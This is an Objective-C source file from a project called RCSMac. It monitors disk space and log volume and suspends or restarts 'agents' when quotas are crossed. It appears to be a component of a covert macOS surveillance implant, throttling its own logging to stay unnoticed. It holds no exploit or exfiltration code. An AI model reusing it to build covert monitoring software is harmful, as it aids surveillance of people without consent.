//
//  RCSMDiskQuota.m
//  RCSMac
//
//  Created by kiodo on 16/01/12.
//  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSMDiskQuota.h"
#import "RCSMTaskManager.h"
#import "RCSMEvents.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"

static RCSMDiskQuota *sharedDiskQuota = nil;

typedef struct {
  UInt32 disk_quota;
  UInt32 tag;
  UInt32 exit_event;
} quota_conf_entry_t;

typedef struct  {
  UInt32 min_disk_free;
  UInt32 max_disk_log;
  UInt32 log_wipe_file;
} global_conf_t;


@implementation RCSMDiskQuota

@synthesize mMaxQuotaTriggered;

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedDiskQuota == nil)
      {
        sharedDiskQuota = [super allocWithZone: aZone];
        return sharedDiskQuota;
      }
  }

  return nil;
}

+ (RCSMDiskQuota *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedDiskQuota == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedDiskQuota;
}

- (id)init
{
  self = [super init];
  
  if (self)
    {
      mUsedDisk = 0;
      mFreeDisk = 0;
      
      mUsed     = 0;
      mMaxLogQuota = 0;
      mStopAction = nil;
      mStartAction = nil;
      mMaxQuotaTriggered = FALSE;
      
      mMaxGlobalQuotaReached = FALSE;
      mMinGlobalFreeDisk = 0;
      mMaxGlobalLogSize = 0;
      
      [self calcQuotas];
    }
  
  return self;
}

- (BOOL)isQuotaReached
{
  return mMaxGlobalQuotaReached;
}

- (void)incUsed:(UInt32)numBytes
{
  @synchronized(self)
  {
    mUsed += numBytes;
  }
  
#ifdef DEBUG_QUOTA_
  infoLog(@"used quota %ld [%ld]", mUsed, numBytes);
#endif
}

- (void)decUsed:(UInt32)numBytes
{
  @synchronized(self)
  {
    if (numBytes < mUsed)
      mUsed -= numBytes;
  }
  
#ifdef DEBUG_QUOTA_
  infoLog(@"used quota %ld [%ld]", mUsed, numBytes);
#endif
}

- (void)calcQuotas
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
  NSDictionary *fsAtt = [[NSFileManager defaultManager] attributesOfFileSystemForPath: @"/" error: nil];
  
  mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];
  mDiskSize = [[fsAtt objectForKey: NSFileSystemSize] longLongValue];

  NSArray *folderFiles;
  NSString *path;
  
  folderFiles = [[NSFileManager defaultManager] subpathsAtPath: [[NSBundle mainBundle] bundlePath]];
  
  NSEnumerator *fileEnum = [folderFiles objectEnumerator];
  
  while ( path = [fileEnum nextObject]) 
  {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSString *completePath = [[NSString alloc] initWithFormat: @"%@/%@", [[NSBundle mainBundle] bundlePath], path];
    
    NSDictionary *fattr = [[NSFileManager defaultManager] attributesOfItemAtPath: completePath error:nil];
    mUsed += (UInt32)[[fattr objectForKey: NSFileSize] unsignedIntValue];
    
    [completePath release];
    
    [inner release];
  }
  
#ifdef DEBUG_QUOTA
  infoLog(@"Disk size %llu, free disk %llu, used quota %u", mDiskSize, mFreeDisk, mUsed);
#endif
                                             
  // running quota monitor thread
  [NSThread detachNewThreadSelector:@selector(checkQuotas) 
                           toTarget:self withObject:nil];
  
  [pool release];
}

- (void)resetEventQuotaParam
{
  mMaxLogQuota = 0; 
  mMaxQuotaTriggered = FALSE;
  
  if (mStartAction) 
    {
      [mStartAction release];
      mStartAction = nil;
    }
  
  if (mStopAction) 
    {
      [mStopAction release];
      mStopAction = nil;
    }
}
        
- (void)setEventQuotaParam:(NSDictionary*)confDict
                 andAction:(NSNumber*)anAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (confDict) 
    {
      quota_conf_entry_t *params = (quota_conf_entry_t*)[[confDict objectForKey: @"data"] bytes];
    
      mMaxLogQuota = params->disk_quota;
      mStartAction = [anAction copy];
      mStopAction  = [[NSNumber alloc] initWithInt: params->exit_event];
      
#ifdef DEBUG_QUOTA
    infoLog(@"config: mMaxLogQuota %lu, mStartAction %@, mStopAction %@", 
    mMaxLogQuota, mStartAction, mStopAction);
#endif
    }
    
    mMaxQuotaTriggered = FALSE;
    
  [pool release];
}

- (void)setGlobalQuotaParam:(NSData*)confData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (confData == nil)
    return;
    
  global_conf_t *conf = (global_conf_t*) [confData bytes];
  
  mMaxGlobalLogSize = conf->max_disk_log;
  mMinGlobalFreeDisk = conf->min_disk_free;
  
  // reset by file configuration reloading
  mMaxGlobalQuotaReached = FALSE;
  
#ifdef DEBUG_QUOTA
  infoLog(@"mMaxGlobalLogSize %ld, mMinGlobalFreeDisk %ld ", mMaxGlobalLogSize, mMinGlobalFreeDisk);
#endif

  [pool release];
}

- (UInt32)used
{
  return mUsed;
}

- (void)checkQuotas
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *stopAllAgents = [[NSNumber alloc] initWithInt:1];
  NSNumber *startAllAgents = [[NSNumber alloc] initWithInt:0];
  
  while (TRUE) 
    {
      sleep(1);
    
#ifdef DEBUG_QUOTA
    infoLog(@"mUsed [%lu] mMaxLogQuota [%lu] mMaxGlobalLogSize [%lu] mMaxQuotaTriggered %d", 
            mUsed, mMaxLogQuota, mMaxGlobalLogSize, mMaxQuotaTriggered);
#endif
      
      // check quotas till logs are flushed
      if ([[RCSMTaskManager sharedInstance] mIsSyncing])
          continue;
          
#ifdef DEBUG_QUOTA
    infoLog(@"checking... %d", (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  mUsed > mMaxLogQuota));
#endif   

       // Check and trigger quota events in an out
      if (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  (mUsed > mMaxLogQuota))
        {
#ifdef DEBUG_QUOTA
          infoLog(@"mMaxQuotaTriggered %ld [%ld]", mMaxLogQuota, mUsed);
#endif
          mMaxQuotaTriggered = TRUE;
        }
      
      sleep(1);
          
      if (mMaxLogQuota > 0 && mMaxQuotaTriggered == TRUE && (mUsed < mMaxLogQuota))
        {
#ifdef DEBUG_QUOTA
        infoLog(@"mMaxQuota untriggered %ld [%ld]", mMaxLogQuota, mUsed);
#endif
          mMaxQuotaTriggered = FALSE;
        }
       
      // check and set/reset flags for global conf vars
      NSDictionary *fsAtt = [[NSFileManager defaultManager] attributesOfFileSystemForPath: @"/" error: nil];
      mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];

      sleep(1);

      if (mMaxGlobalQuotaReached == FALSE && 
          ((mFreeDisk < mMinGlobalFreeDisk) || (mUsed > mMaxGlobalLogSize)) )
        {
          mMaxGlobalQuotaReached = TRUE;

          // Quota disk exceded to taskManager: stop all agents activity
          [[RCSMTaskManager sharedInstance] suspendAgents];
          
#ifdef DEBUG_QUOTA
          infoLog(@"mMaxGlobalQuotaReached exceeded [%lu > %lu]", mUsed, mMaxGlobalLogSize);
#endif
        }
       
      sleep(1);
      
      if (mMaxGlobalQuotaReached == TRUE && 
          ((mFreeDisk > mMinGlobalFreeDisk) && (mUsed < mMaxGlobalLogSize)) )
        {
          mMaxGlobalQuotaReached = FALSE;
          
          // send quota disk now available to taskManager: renable all agents
          [[RCSMTaskManager sharedInstance] restartAgents];
          
#ifdef DEBUG_QUOTA
          infoLog(@"mMaxGlobalQuotaReached available [%lu > %lu]", mUsed, mMaxGlobalLogSize);
#endif
        }
       
    }
      
  [stopAllAgents release];
  [startAllAgents release];
  
  [pool release];
}

@end
